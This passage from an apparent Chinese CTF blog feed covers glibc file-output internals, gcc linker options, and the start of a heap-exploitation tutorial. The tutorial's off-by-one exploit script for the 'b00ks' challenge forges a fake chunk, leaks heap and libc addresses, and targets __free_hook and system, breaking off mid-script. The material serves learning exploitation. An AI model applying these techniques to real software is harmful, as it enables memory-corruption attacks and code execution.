<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> request = size * count;</span><br><span class="line">  <span class="type">size_t</span> written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="comment">/* We have written all of the input in case the return value indicates</span></span><br><span class="line"><span class="comment">     this or EOF is returned.  The latter is a special case where we</span></span><br><span class="line"><span class="comment">     simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class="line"><span class="comment">     buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> to_do = n;</span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  <span class="type">size_t</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">	  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		  count = p - s + <span class="number">1</span>;</span><br><span class="line">		  must_flush = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">	count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">	<span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">	   caller that everything has been written.  */</span></span><br><span class="line">	<span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">	&#123;</span><br><span class="line">	  count = new_do_write (f, s, do_write);</span><br><span class="line">	  to_do -= count;</span><br><span class="line">	  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">	    <span class="keyword">return</span> n - to_do;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">	 buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">	 so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">	to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (<span class="type">size_t</span>) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">	    count = more;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">	      s += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">	      <span class="type">ssize_t</span> i;</span><br><span class="line">	      <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">		*p++ = *s++;</span><br><span class="line">	      f-&gt;_IO_write_ptr = p;</span><br><span class="line">	    &#125;</span><br><span class="line">	  more -= count;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>























<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://www.anquanke.com/post/id/177958">https://www.anquanke.com/post/id/177958</a></p>
<p><a href="https://www.anquanke.com/post/id/177910">https://www.anquanke.com/post/id/177910</a></p>
<p><a href="https://tttang.com/archive/1279/#toc_0x00">https://tttang.com/archive/1279/#toc_0x00</a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>IO</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>IO_FILE</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>gcc天问之路</title>
    <url>/2024/08/09/gcc%E5%A4%A9%E9%97%AE%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<h1 id="gcc链接器"><a href="#gcc链接器" class="headerlink" title="gcc链接器"></a>gcc链接器</h1><h2 id="探坑之路"><a href="#探坑之路" class="headerlink" title="探坑之路"></a>探坑之路</h2><p>因为要为malloc的漏洞利用写demo，需要不同版本的共享库，之前一直再逃避写demo这件事，一直用的可执行文件，利用patchelf来更改链接器路径，但是为了深入学习还是得自己写demo，需要掌握编译链接的全过程。</p>
<p>一定要记住GUN不止GCC，gcc的时候也不是仅仅用gcc，遵从stfm的原则，想深入了解一下汇编链接的全过程去查看了一下gcc的文档，好无知，哈哈哈，明明更改动态链接库的版本需要的是ld，为什么要看gcc的文档呢，还是因为-Wl选项救了我，一看解释居然是给链接器传递参数。哈哈哈。接着赶快去看linker的文档，主要用上了这两个选项：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--rpath=...</span><br><span class="line">--dynamic-linker=....</span><br></pre></td></tr></table></figure>

<p>–rpath选项按文档上说是链接时查找的共享对象，但是我对这个共享库也知道甚少，因此对于其也仅仅会用的状态。</p>
<p>–dynamic-linker选项按文档的解释是更改linker的可执行文件，彻底激发了我的好奇心，原来linker可以被直接使用的，一直以为是个库，哈哈哈哈，无知的我。然后就去查了ld的文件类型。结果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">l@L:/usr/bin$ file ld</span><br><span class="line">ld: symbolic link to x86_64-linux-gnu-ld</span><br><span class="line">l@L:/usr/bin$ file x86_64-linux-gnu-ld</span><br><span class="line">x86_64-linux-gnu-ld: symbolic link to x86_64-linux-gnu-ld.bfd</span><br><span class="line">l@L:/usr/bin$ file x86_64-linux-gnu-ld.bfd</span><br><span class="line">x86_64-linux-gnu-ld.bfd: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c93d251e4e665bc9768ef05ba3086b166e95ec2b, for GNU/Linux 3.2.0, stripped</span><br><span class="line">l@L:/usr/bin$ file /lib64/ld-linux-x86-64.so.2</span><br><span class="line">/lib64/ld-linux-x86-64.so.2: symbolic link to /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">l@L:/usr/bin$ file /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, BuildID[sha1]=4186944c50f8a32b47d74931e3f512b811813b64, stripped</span><br></pre></td></tr></table></figure>

<p>盲菜ld这个东西是一个封装后的可以被人使用的程序，但是本质来看还是ld-linux-x86-64.so.2，调用其会出现：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">l@L:/usr/bin$ /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 --help</span><br><span class="line">Usage: /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 [OPTION]... EXECUTABLE-FILE [ARGS-FOR-PROGRAM...]</span><br><span class="line">You have invoked &#x27;ld.so&#x27;, the program interpreter for dynamically-linked</span><br><span class="line">ELF programs.  Usually, the program interpreter is invoked automatically</span><br><span class="line">when a dynamically-linked executable is started.</span><br><span class="line"></span><br><span class="line">You may invoke the program interpreter program directly from the command</span><br><span class="line">line to load and run an ELF executable file; this is like executing that</span><br><span class="line">file itself, but always uses the program interpreter you invoked,</span><br><span class="line">instead of the program interpreter specified in the executable file you</span><br><span class="line">run.  Invoking the program interpreter directly provides access to</span><br><span class="line">additional diagnostics, and changing the dynamic linker behavior without</span><br><span class="line">setting environment variables (which would be inherited by subprocesses).</span><br></pre></td></tr></table></figure>

<p>坑越来越深，哈哈哈。</p>
<p>不过还是先记录下更改链接器的选项，不然又得查了：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc top_chunk_demo1.c -Wl,--rpath=/home/l/how2heap/glibc-all-in-one/libs/2.23-0ubuntu3_amd64 -Wl,--dynamic-linker=/home/l/how2heap/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so</span><br></pre></td></tr></table></figure>

<h2 id="无端猜测"><a href="#无端猜测" class="headerlink" title="无端猜测"></a>无端猜测</h2><p>本来挖出来的坑很多，要不就趁此机会把elf文件类型和编译过程真正搞通透，为未来的逆向打好基础，因为最近在学编译原理，一想，我还是把编译原理学完再说吧，效率高一点，编译原理目前是学到了yacc，以我浅薄的知识盲猜一下这个gcc的linker过程，汇编啥的不说了，所谓动态链接我猜测就是类似于python的解释过程，因为我在上述挖坑时看elf段意外发现了interpret这个段，楞一看这玩意跟解释器啥区别，之前一听解释器居然完全没联想起来，我一想动态连接，这玩意不就是在运行时需要啥拿啥吗，这python的解释器也是边解释边运行啊，编译模式的编译器，解释模式的编译器各有优点，这GUN怎么都有啊。。。。。难道时两者有点的结合？？我不知道，等学完编译原理再来补下面的吧，哈哈哈。</p>
]]></content>
      <categories>
        <category>cs</category>
        <category>杂项</category>
        <category>gcc|gun</category>
      </categories>
      <tags>
        <tag>gcc</tag>
        <tag>elf</tag>
        <tag>cs</tag>
      </tags>
  </entry>
  <entry>
    <title>heap利用(入门)</title>
    <url>/2024/08/01/heap%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h1><p>在一个可以写的区域伪造chunk（通过off-by-one使系统的指向chunk的指针能指向伪造chunk）</p>
<p><strong>注意chunk的大小的构造</strong></p>
<p><strong>其中指针有多层，因此可以泄露并且修改，p2地址泄露之后，覆盖p2为想要操作的地址，将p4将内容改为想要的内容</strong></p>
<ol>
<li><strong>p1-&gt;p2-&gt;内容</strong></li>
<li><strong>p1-&gt;p4-&gt;内容(更改p1的值)</strong></li>
</ol>
<p><strong>3.p1-&gt;p4-&gt;新内容（更改p1的指向的值）</strong></p>
<p><strong>对于一二步骤p1在第二层，但是对于第一步骤p1在第一层</strong></p>
<p><strong>想更改p1的间接内容，需要更新p1的指向为p4，需要把p1移到第二层（先泄露&amp;p1，然后再一个块的内部伪造一个新的chunk，其中放入&amp;p1，成功将其到第二层），通过fakechunk的一些操作可以更改p1的值（也就是改为&amp;p4），这样可以更改p4指向的内容，那么p1应该改成什么（改成泄露的重要地址，此题通过p1的指向来泄露，也就是&amp;p4和&amp;p2有着千丝万缕的关系）</strong></p>
<p><strong>更改p的值，和p的指向的值</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">binary = ELF(<span class="string">&quot;b00ks&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/l/how2heap/glibc-all-in-one/libs/2.21-0ubuntu4.3_amd64/libc.so.6&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createbook</span>(<span class="params">name_size, name, des_size, des</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book name size: &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(name_size), <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(name), <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book description size: &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(des_size), <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book description: &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(des), <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printbook</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">id</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;ID: &quot;</span>)</span><br><span class="line">        book_id = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">        <span class="built_in">print</span>(book_id)</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Name: &quot;</span>)</span><br><span class="line">        book_name = io.recvline().strip()</span><br><span class="line">        <span class="built_in">print</span>(book_name)</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Description: &quot;</span>)</span><br><span class="line">        book_des = io.recvline().strip()</span><br><span class="line">        <span class="built_in">print</span>(book_des)</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Author: &quot;</span>)</span><br><span class="line">        book_author = io.recvline().strip()</span><br><span class="line">        <span class="built_in">print</span>(book_author)</span><br><span class="line">    <span class="keyword">return</span> book_id, book_name, book_des, book_author</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changename</span>(<span class="params">name</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>,<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Enter author name: &#x27;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(name).encode(<span class="string">&#x27;ascii&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editbook</span>(<span class="params">book_id, new_des</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter the book id you want to edit: &quot;</span>,book_id)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter new book description: &quot;</span>,new_des)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletebook</span>(<span class="params">book_id</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter the book id you want to delete: &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(book_id).encode(<span class="string">&#x27;ascii&#x27;</span>)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exitpro</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>, <span class="string">b&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Enter author name: &quot;</span>,<span class="number">32</span>*<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">createbook(<span class="string">&quot;32&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;272&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">createbook(<span class="string">&quot;135168&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;135168&quot;</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line">book_id_1,book_name,book_des,book_author=printbook([<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(book_author[<span class="number">32</span>:<span class="number">38</span>])</span><br><span class="line">book1_addr=u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;book1_address:&quot;</span>+<span class="built_in">hex</span>(book1_addr))</span><br><span class="line">p2vmmap = book1_addr+<span class="number">0x40</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(p2vmmap))</span><br><span class="line"></span><br><span class="line">payload=(<span class="number">0x58</span>+<span class="number">0x60</span>)*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x31</span>)+p64(<span class="number">0x1</span>)+p64(p2vmmap)+p64(p2vmmap)+p64(<span class="number">0x20</span>)</span><br><span class="line">editbook(<span class="string">b&#x27;1&#x27;</span>, payload)</span><br><span class="line">changename(<span class="string">&quot;A&quot;</span>*<span class="number">32</span>)</span><br><span class="line">book_id_1,book_name,book_des,book_author=printbook([<span class="number">1</span>])</span><br><span class="line">book2_des_addr=u64(book_des.ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">libc_base=book2_des_addr-<span class="number">0x5a3010</span></span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">sysbin = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.success(<span class="string">&quot;free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">log.success(<span class="string">&quot;sysbin:&quot;</span>+<span 